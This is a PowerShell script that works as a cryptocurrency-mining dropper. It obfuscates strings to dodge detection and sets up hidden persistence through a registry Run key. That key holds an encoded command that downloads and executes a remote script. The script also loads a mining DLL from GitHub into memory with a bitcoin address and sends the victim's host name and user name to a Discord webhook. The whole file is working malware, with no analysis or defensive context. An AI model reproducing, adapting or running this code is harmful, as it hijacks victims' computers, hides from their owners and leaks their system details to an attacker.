$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Write-Host "Initializing..."

# Config - Obfuscated strings to avoid simple signature detection
Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
$u1 = 'HolyV200'; $u2 = 'trollminer'
$addr = "bc1qly9l5tledssjfl8nxq97sdl55je04hjh790z44"
$p1 = 'https://raw'; $p2 = 'githubusercontent.com'
$base = "$p1.$p2/$u1/$u2/main"

# Process Check - Kill existing to avoid conflicts
$current = $PID
try { 
    Get-Process | Where-Object { $_.CommandLine -like '*update.ps1*' -and $_.Id -ne $current } | Stop-Process -Force -ErrorAction SilentlyContinue 
} catch {}

# HW Detection - Optimized for speed
$gpu = $false
try {
    $vcs = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
    foreach ($vc in $vcs) {
        $n = $vc.Name.ToUpper()
        if ($n -match 'NVIDIA|AMD|RADEON|RTX|GTX' -and $vc.AdapterRAM -gt 3GB) {
            if ($n -notmatch 'BASIC|DISPLAY') { $gpu = $true; break }
        }
    }
} catch {}

# Stealth Persistence - HKCU is safe for non-admin, uses encoded command to avoid CMD escaping hell
$rawPath = "$base/update.ps1"
$payload = "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (Invoke-RestMethod -Uri '$rawPath')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encoded = [Convert]::ToBase64String($bytes)
$pCmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded"

try {
    $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    Set-ItemProperty -Path $runKey -Name 'UpdateCoord' -Value $pCmd -ErrorAction SilentlyContinue
} catch {}

# Memory Injection - Loading DLL directly into RAM
try {
    $dllUrl = "$base/Bridge.dll?v=$([Guid]::NewGuid())"
    $bytes = Invoke-RestMethod -Uri $dllUrl -UseBasicParsing
    $asm = [Reflection.Assembly]::Load($bytes)
    $type = $asm.GetType('DateFundLoader')
    $method = $type.GetMethod('StartMiner')
    $method.Invoke($null, @($gpu, $addr))
} catch {
    # Fallback to older PS versions if Invoke-RestMethod fails for binary
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $bytes = $wc.DownloadData($dllUrl)
        $asm = [Reflection.Assembly]::Load($bytes)
        $asm.GetType('DateFundLoader').GetMethod('StartMiner').Invoke($null, @($gpu, $addr))
    } catch {}
}

# Discord Check-in
try {
    $wh = "https://discord.com/api/webhooks/1499899715582558228/M_6btxpgSDH5UBHvf3zbCyMr0jERa0eYZKdQ8pVR49kHRcjzSOTm-v1eIIhMkrPaPG8l"
    $json = @{
        embeds = @(@{
            title = "Worker Online"
            description = "🟢 **Deployment Success**`nHost: **$($env:COMPUTERNAME)**`nUser: **$($env:USERNAME)**`nGPU: **$($gpu)**"
            color = 3066993
        })
    } | ConvertTo-Json
    Invoke-RestMethod -Uri $wh -Method Post -Body $json -ContentType "application/json" -ErrorAction SilentlyContinue
} catch {}



Write-Host "flight is rinsed holy dumbass"


# Background Loop
while ($true) { Start-Sleep -Seconds 3600 }
